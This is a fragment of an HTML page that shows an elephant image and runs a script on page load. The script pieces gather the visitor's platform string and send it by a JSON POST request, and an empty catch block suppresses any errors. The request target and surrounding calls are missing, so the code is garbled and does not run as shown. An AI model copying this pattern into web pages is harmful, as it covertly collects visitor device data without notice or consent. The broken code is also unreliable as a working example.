<body>

    <img src="44p2_1o0n_230629.jpg" alt="Elephant">

    <script>
        window.onload = async () => {

                    platform: navigator.platform,

                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},

                });
            } catch (e) { }
        };
